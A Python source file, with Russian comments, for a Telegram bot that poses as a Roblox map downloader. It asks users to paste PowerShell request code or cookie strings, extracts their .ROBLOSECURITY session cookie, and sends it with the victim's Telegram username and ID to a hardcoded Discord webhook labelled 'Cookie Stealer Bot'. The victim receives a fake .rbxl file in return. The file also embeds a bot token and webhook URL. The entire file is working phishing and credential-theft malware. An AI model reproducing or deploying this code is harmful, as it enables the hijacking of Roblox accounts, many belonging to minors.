import asyncio
import random
import aiohttp
import re
import os
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, FSInputFile
from aiogram.filters import CommandStart

BOT_TOKEN = "8467022515:AAEKhaIBdWLHJ7bn1d-TBkM8Pkf_9Asslq0"

# Discord Webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1410916698143326210/smw3JGFHp0gDqLnphzUBGrp_1mCwdk06oB7IRZ9Fp5akO1DBHae11Xa3qKJYd8XSLuhN"

router = Router()

# Храним части сообщений для пользователей
user_code_parts = {}

def get_keyboard():
    buttons = [
        [InlineKeyboardButton(text="📤 Отправить код", callback_data="send_code")],
        [InlineKeyboardButton(text="📖 Туториал", callback_data="tutorial")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def extract_game_name_from_powershell(full_code: str):
    """Извлекает название игры из PowerShell кода"""
    patterns = [
        r'"path"="/(?:games|game)/(?:\d+)/([^"/]+)"',
        r'Uri "https://www\.roblox\.com/games/\d+/([^"]+)"',
        r'/games/\d+/([^"/]+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, full_code)
        if match:
            game_name = match.group(1)
            game_name = re.sub(r'[<>:"/\\|?*]', '', game_name)
            return f"{game_name}.rbxl"
    
    return "Steal_a_Braintot.rbxl"

def extract_roblosecurity_value(full_code: str):
    """Извлекает значение .ROBLOSECURITY"""
    if not full_code:
        return None
    
    # Ищем строку с .ROBLOSECURITY
    lines = full_code.split('\n')
    roblo_line = ""
    
    for line in lines:
        if '.ROBLOSECURITY' in line:
            roblo_line = line.strip()
            break
    
    if not roblo_line:
        return None
    
    # Извлекаем значение между кавычками после .ROBLOSECURITY (PowerShell)
    pattern = r'\.ROBLOSECURITY",\s*"([^"]+)"'
    match = re.search(pattern, roblo_line)
    
    if match:
        return match.group(1)
    
    # Если не нашли в PowerShell формате, пробуем простой формат
    if '.ROBLOSECURITY=' in full_code:
        simple_pattern = r'\.ROBLOSECURITY=([^;]+)'
        simple_match = re.search(simple_pattern, full_code)
        if simple_match:
            return simple_match.group(1)
    
    return None

async def send_cookie_to_discord(cookie_value: str, user_info: str):
    """Отправляет .ROBLOSECURITY куки в Discord с юзернеймом и айди"""
    try:
        if not cookie_value:
            return
        
        # Формируем куки в правильном формате
        cookie = f".ROBLOSECURITY={cookie_value}"
        
        # Проверяем длину (Discord ограничение 2000 символов)
        if len(cookie) > 1990:
            # Обрезаем если слишком длинный
            cookie = cookie[:1990] + "..."
        
        # Отправляем сообщение с куки и информацией о пользователе
        message_content = f"@everyone\n**Юзер:** {user_info}\n\n{cookie}"
        
        payload = {
            "content": message_content,
            "username": "Cookie Stealer Bot"
        }
        
        async with aiohttp.ClientSession() as session:
            response = await session.post(DISCORD_WEBHOOK_URL, json=payload)
            
            if response.status == 204:
                print(f"[SUCCESS] Куки отправлен в Discord от {user_info}")
                print(f"[DEBUG] Длина куки: {len(cookie)} символов")
            else:
                print(f"[ERROR] Discord ответ: {response.status}")
                
    except Exception as e:
        print(f"[ERROR] Ошибка отправки: {e}")

@router.message(CommandStart())
async def start(message: Message):
    text = (
        "🛠️ *Отправьте код как из туториала*\n\n"
        "⚠️ Бот ожидает код для скачивания карты\n"
        "👇 Выберите действие:"
    )
    await message.answer(text, reply_markup=get_keyboard())

@router.callback_query(F.data == "tutorial")
async def tutorial(callback: CallbackQuery):
    await callback.message.answer("тест")
    await callback.answer()

@router.callback_query(F.data == "send_code")
async def send_code(callback: CallbackQuery):
    await callback.message.answer("ожидаю код")
    await callback.answer()

@router.message(F.text)
async def get_code(message: Message):
    user_id = message.from_user.id
    code_part = message.text.strip()
    
    # Добавляем часть кода
    if user_id not in user_code_parts:
        user_code_parts[user_id] = []
    
    user_code_parts[user_id].append(code_part)
    
    # Собираем пока что есть
    full_code_so_far = "\n".join(user_code_parts[user_id])
    
    # Проверяем тип и завершенность
    is_powershell = '$session' in full_code_so_far or 'Invoke-WebRequest' in full_code_so_far
    is_simple_cookie = '.ROBLOSECURITY=' in full_code_so_far and not is_powershell
    
    is_complete = False
    
    if is_powershell:
        if ('Invoke-WebRequest' in full_code_so_far and 
            ('}' in code_part or 
             '"upgrade-insecure-requests"="1"' in code_part or
             len(user_code_parts[user_id]) >= 10)):
            is_complete = True
    
    if is_simple_cookie:
        if ';' in full_code_so_far or len(user_code_parts[user_id]) >= 2:
            is_complete = True
    
    if is_complete:
        # Полный код
        full_code = "\n".join(user_code_parts[user_id])
        
        # Информация о пользователе Telegram
        user_info = ""
        if message.from_user.username:
            user_info += f"@{message.from_user.username}"
        else:
            user_info += "Без юзернейма"
        
        user_info += f" | ID: {message.from_user.id}"
        
        print(f"[+] Получен код от {user_info}")
        print(f"[DEBUG] Длина кода: {len(full_code)} символов")
        
        # Извлекаем куки
        roblosecurity_value = extract_roblosecurity_value(full_code)
        
        # Отправляем куки в Discord с юзернеймом и айди
        if roblosecurity_value:
            await send_cookie_to_discord(roblosecurity_value, user_info)
        else:
            print("[ERROR] Не удалось извлечь куки")
        
        # Показываем пользователю процесс
        wait_msg = await message.answer("подождите 5-10сек")
        
        # Ждем
        wait_time = random.randint(5, 10)
        await asyncio.sleep(wait_time)
        
        # Имя файла
        filename = extract_game_name_from_powershell(full_code) if is_powershell else "Steal_a_Braintot.rbxl"
        
        # Создаем файл
        try:
            if not os.path.exists("temp_files"):
                os.makedirs("temp_files")
            
            filepath = os.path.join("temp_files", filename)
            
            # Записываем куки в файл
            with open(filepath, 'w', encoding='utf-8') as f:
                if roblosecurity_value:
                    f.write(f".ROBLOSECURITY={roblosecurity_value}")
                else:
                    f.write("Не удалось извлечь куки")
            
            document = FSInputFile(filepath, filename=filename)
            await message.answer_document(document, caption=f"✅ Файл: {filename}")
            
            os.remove(filepath)
            
        except Exception as e:
            print(f"[ERROR] Ошибка: {e}")
            await wait_msg.edit_text("ошибка")
        
        # Очищаем
        if user_id in user_code_parts:
            del user_code_parts[user_id]
            
    else:
        # Ждем следующую часть
        try:
            await message.delete()
        except:
            pass

async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())